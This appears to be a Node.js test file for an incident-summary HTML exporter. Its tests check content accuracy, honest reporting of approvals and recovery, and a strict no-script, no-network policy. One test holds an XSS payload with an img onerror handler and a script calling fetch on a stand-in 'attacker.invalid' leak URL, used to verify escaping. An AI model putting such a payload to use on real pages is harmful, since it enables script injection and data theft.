import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { build } from "esbuild";

const bundle = await build({
  entryPoints: [
    fileURLToPath(new URL("../src/incident-export.ts", import.meta.url)),
  ],
  bundle: true,
  format: "esm",
  platform: "node",
  write: false,
});
const { buildIncidentSummaryHtml } = await import(
  `data:text/javascript;base64,${Buffer.from(bundle.outputFiles[0].text).toString("base64")}`
);
const original = JSON.parse(
  await readFile(new URL("../src/live-case.json", import.meta.url), "utf8"),
);
const record = () => structuredClone(original);
const escape = (value) =>
  String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");

test("the complete case exports a readable employee summary with the original proof", () => {
  const value = record();
  const before = structuredClone(value);
  const html = buildIncidentSummaryHtml(value);
  assert.deepEqual(value, before);
  assert.match(html, /<html lang="tr">/);
  assert.match(html, /HTTP 500 doğrulandı/);
  assert.match(html, /Doğrulanmış müdahale/);
  assert.match(html, /Toparlanma doğrulandı/);
  assert.match(html, /2 model araç çağrısı/);
  assert.match(html, /9,5 saniye/);
  assert.match(html, /19 Ekim 2026/);
  assert.match(html, /00:57:38/);
  assert.ok(html.includes(original.incident.id));
  assert.ok(html.includes(escape(original.scope)));
  assert.ok(html.includes(escape(original.approval_actor)));
  assert.ok(
    html.includes(escape(original.incident.diagnoses[0].report.summary)),
  );
  for (const evidence of original.incident.evidence)
    assert.ok(html.includes(evidence.id));
  for (const action of original.incident.story.actions)
    assert.ok(html.includes(action.id));
  assert.match(html, /kesin kök neden kanıtı sayılmaz/);
  assert.match(html, /AI yanıt süresi veya kazanılan zaman değildir/);
});

test("portable HTML has no scripts, network assets, submission or external links", () => {
  const html = buildIncidentSummaryHtml(record());
  assert.equal((html.match(/<html\b/g) ?? []).length, 1);
  assert.equal((html.match(/<\/html>/g) ?? []).length, 1);
  assert.match(html, /<meta charset="utf-8">/);
  assert.match(html, /Content-Security-Policy/);
  assert.match(html, /default-src 'none'/);
  assert.match(html, /@media print/);
  assert.match(html, /@media\(max-width:720px\)/);
  assert.doesNotMatch(
    html,
    /<(?:script|link|img|iframe|object|embed|video|audio|form)\b/i,
  );
  assert.doesNotMatch(html, /@import\b|url\s*\(/i);
  for (const [, href] of html.matchAll(/\bhref="([^"]*)"/g))
    assert.match(href, /^#evidence-\d+$/);
  for (const [tag] of html.matchAll(/<(?!\/|!)[^>]+>/g)) {
    assert.doesNotMatch(tag, /\bon[a-z]+\s*=/i);
    assert.doesNotMatch(tag, /\b(?:src|srcset|action|formaction)\s*=/i);
  }
});

test("model text, metadata, IDs and raw evidence cannot inject executable markup", () => {
  const value = record();
  const attack = `</title></pre><img src="https://attacker.invalid/pixel" onerror='alert(1)'><script>fetch("https://attacker.invalid/leak")</script>&`;
  value.incident.id = attack;
  value.incident.service_id = attack;
  value.incident.status = attack;
  value.incident.check = attack;
  value.model = attack;
  value.scope = attack;
  value.approval_actor = attack;
  const report = value.incident.diagnoses[0].report;
  report.summary = attack;
  report.findings[0].statement = attack;
  report.findings[0].confidence = attack;
  report.findings[0].evidence_ids = [attack];
  report.recommendations = [attack];
  report.unknowns = [attack];
  report.source_ids = [attack];
  value.incident.evidence[0].source = attack;
  value.incident.evidence[0].id = attack;
  value.incident.evidence[0].data = { [attack]: attack };
  value.incident.story.actions[0].id = attack;
  value.incident.story.actions[0].actor = attack;
  value.incident.story.actions[0].action = attack;
  const html = buildIncidentSummaryHtml(value);
  assert.ok(
    html.includes(escape(attack)),
    "the attack remains visible as escaped text",
  );
  assert.doesNotMatch(html, /<(?:script|img)\b/i);
  assert.equal((html.match(/<\/title>/g) ?? []).length, 1);
  for (const [tag] of html.matchAll(/<(?!\/|!)[^>]+>/g)) {
    assert.doesNotMatch(tag, /attacker\.invalid|\bonerror\s*=/i);
  }
  for (const [, href] of html.matchAll(/\bhref="([^"]*)"/g))
    assert.match(href, /^#evidence-\d+$/);
});

test("missing or unrelated approval cannot become a successful intervention", async (t) => {
  for (const kind of [
    "absent",
    "unrelated",
    "failed",
    "HTTP assertion absent",
  ]) {
    await t.test(kind, () => {
      const value = record();
      if (kind === "absent") value.incident.story.approvals = [];
      else if (kind === "unrelated")
        value.incident.story.approvals[0].incident_id = "another-incident";
      else if (kind === "failed")
        value.incident.story.approvals[0].status = "failed";
      else
        value.checks = value.checks.filter(
          (check) => check !== "post-action HTTP 200",
        );
      const html = buildIncidentSummaryHtml(value);
      assert.match(html, /Müdahale doğrulanamadı/);
      assert.match(html, /Toparlanma doğrulanamadı/);
      assert.doesNotMatch(html, /Doğrulanmış müdahale|Toparlanma doğrulandı/);
    });
  }
});

test("a resolved status without a healthy recovery cannot claim recovery or elapsed time", () => {
  const value = record();
  value.incident.story.recovery = null;
  const html = buildIncidentSummaryHtml(value);
  assert.match(html, /Kayıt durumu: Çözüldü/);
  assert.match(html, /Doğrulanmış müdahale/);
  assert.match(
    html,
    /İşlem sonrası HTTP 200 var; ilgili sağlıklı toparlanma gözlemi eksik/,
  );
  assert.match(html, /Toparlanma doğrulanamadı/);
  assert.match(html, /Doğrulanmış gözlemlerden olay süresi hesaplanamadı/);
  assert.doesNotMatch(html, /Toparlanma doğrulandı|9,5 saniye/);
});

test("missing model report remains explicitly missing and does not invent tools or sources", () => {
  const value = record();
  value.incident.diagnoses = [];
  const html = buildIncidentSummaryHtml(value);
  assert.match(html, /Tamamlanmış AI raporu yok/);
  assert.match(html, /0 model araç çağrısı/);
  assert.match(
    html,
    /Seçili AI çalışmasına ve bu arızaya bağlanabilen model araç çağrısı bulunamadı/,
  );
  assert.doesNotMatch(html, /Rapordaki rehber kimlikleri/);
});

test("guide IDs are cited without claiming the archived source document is present", () => {
  const html = buildIncidentSummaryHtml(record());
  assert.match(html, /runbook:http500/);
  assert.match(html, /Özgün rehber metni bu kayıtta yok/);
  assert.match(html, /tam içeriği veya sürümü bu özetten doğrulanamaz/);
});

test("missing record sections and scope stay unknown rather than borrowing original metadata", () => {
  const value = record();
  delete value.incident.story;
  delete value.incident.diagnoses;
  delete value.incident.evidence;
  delete value.scope;
  delete value.approval_actor;
  value.checks = [];
  const html = buildIncidentSummaryHtml(value);
  assert.match(html, /HTTP sonucu bilinmiyor/);
  assert.match(html, /Platform ve depolama kapsamı kayıtta belirtilmemiş/);
  assert.match(html, /Onay aktörünün ek açıklaması kayıtta yok/);
  assert.match(html, /Bu özete eklenmiş kanıt kaydı yok/);
  assert.match(html, /Kaydedilmiş doğrulama kontrolü yok/);
  assert.doesNotMatch(
    html,
    /HTTP 500 doğrulandı|Doğrulanmış müdahale|Toparlanma doğrulandı|Windows host \/ SQLite/,
  );
});

test("simulation source kind is labelled instead of silently presented as a real observation", () => {
  const value = record();
  value.incident.source_kind = "simulation";
  assert.match(buildIncidentSummaryHtml(value), /<span>Simülasyon<\/span>/);
});
